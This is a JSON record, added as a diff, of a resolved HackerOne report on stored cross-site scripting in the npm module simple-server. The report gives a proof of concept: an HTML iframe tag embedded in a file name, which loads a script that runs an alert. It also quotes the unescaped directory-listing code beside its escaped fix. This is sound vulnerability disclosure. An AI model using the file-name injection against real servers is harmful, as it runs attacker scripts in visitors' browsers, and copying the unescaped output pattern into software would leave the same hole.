@@ -1,0 +1,133 @@
+{
+  "id": 309641,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDk2NDE=",
+  "url": "https://hackerone.com/reports/309641",
+  "title": "[simple-server] HTML with iframe element can be used as filename, which might lead to load and execute malicious JavaScript ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-26T21:38:57.170Z",
+  "submitted_at": "2018-01-26T21:38:57.170Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-3717"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-03-01T23:04:03.545Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-01-30T23:04:00.978Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi Guys,\n\n**simple-server** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript. This is caused by outdated version of ```connect``` framework.\n\n**Module:** \n\nSimple Server allows you to easily get a node.js static file server up and running anywhere anytime.\n\nhttps://www.npmjs.com/package/simple-server\n\n**Description**\n\nThis issue is exactly the same I've reported for ```anywhere``` module (https://hackerone.com/reports/309394).\nThe problem is outdated ```connect``` framework (2.10.0) with obsolete middleware used to display content of the directory as HTML.\n\nThis is the code which allows to embed HTML in file names and execute attack described in PoC (```/node_modules/connect/lib/middleware/directory.js```, lines 192-197):\n\n```javascript\n\n    return '<li><a href=\"'\n      + utils.normalizeSlashes(normalize(path.join('/')))\n      + '\" class=\"'\n      + classes.join(' ') + '\"'\n      + ' title=\"' + file + '\">'\n      + icon + file + '</a></li>';\n```\n\nAs you can see, ```file``` is output directly into HTML without any sanitization.\n\nNow, take a look how the same fragment of code looks in ```serve-index``` middleware, introduced in place of old middlewares like ```directory.js``` above, and  used in current Connect and Express frameworks (https://github.com/expressjs/serve-index/blob/a399faa1801f02ee1885e5664ed21a9c7990b63a/index.js#L279):\n\n```javascript\nreturn '<li><a href=\"'\n      + escapeHtml(normalizeSlashes(normalize(path.join('/'))))\n      + '\" class=\"' + escapeHtml(classes.join(' ')) + '\"'\n      + ' title=\"' + escapeHtml(file.name) + '\">'\n      + '<span class=\"name\">' + escapeHtml(file.name) + '</span>'\n      + '<span class=\"size\">' + escapeHtml(size) + '</span>'\n      + '<span class=\"date\">' + escapeHtml(date) + '</span>'\n      + '</a></li>';\n```\n\nAll output data is sanitized with ```escapeHtml()``` which sanitizes HTML before is send to browser.\n\nI think this is the problem of all older npm modules using old versions of Connect middlewares like ```directory.js```.\n\n\n## PoC - Steps To Reproduce:\n\nIn the directory which will be served via ```simple-server```, create file with following name:\n\n```\n\"><iframe src=\"malware_frame.html\">\n```\n\nThen, HTML file with following content have to be saved in the same directory as file with the name changed:\n\n```\n<html>\n\n<head>\n    <meta charset=\"utf8\" />\n    <title>Frame embeded with malware :P</title>\n</head>\n\n<body>\n    <p>iframe element with malicious code</p>\n    <script type=\"text/javascript\" src=\"malware.js\"></script>\n</body>\n\n</html>\n```\n\nAn ```src``` attribute value I've used here is just for PoC purpose, this can be any external url.\nOn my local machine, ```malware.js``` has following content:\n\n```\nalert('Uh oh, I am very bad malware!')\n```\n\nRun ```simple-server`` in directory where both file with filename changed and ```malware_frame.html``` are saved:\n\n```\n$ ./node_modules/simple-server/bin/simple-server.js ./ 8080\nSimple-Server listening to http://:::8080/ with directory /Users/bl4de/playground/node_bugbounty_playground\n```\n\nand open ```http://127.0.0.1:8080``` in the browser, you can see JavaScript from ```malware.js``` is executed.\n\n## Supporting Material/References:\n\nConfiguration I've used to find this vulnerability:\n\n- macOS HighSierra 10.13.3\n- node 8.9.3\n- npm 5.5.1\n- curl 7.54.0\n\n## Wrap up\n\nI hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.\n\nThank you\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nExploitation of this vulnerability in the wild might be hard, however it's not impossible and it depends only on attacker's skills to get into directory on the server, where ```simple-server``` is used to serve static content.",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-03-01T23:04:01.085Z",
+  "allow_singular_disclosure_after": -258394839.45665467,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "muon4",
+    "eveeez",
+    "khalooda0x",
+    "m7mdharoun",
+    "666reda",
+    "geotester"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.7,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "none",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 7002,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "simple-server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
